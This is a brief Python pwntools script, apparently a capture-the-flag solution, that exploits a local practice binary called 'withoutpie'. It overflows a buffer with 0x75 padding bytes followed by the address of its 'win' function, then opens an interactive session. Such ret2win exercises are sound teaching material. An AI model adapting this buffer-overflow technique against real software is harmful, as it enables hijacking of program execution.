from pwn import *
p = process("./withoutpie")
binary = context.binary = ELF('./withoutpie')
payload = b"A" * (0x75) + p32(binary.sym.win)
p.recv()
p.sendline(payload)
p.interactive()
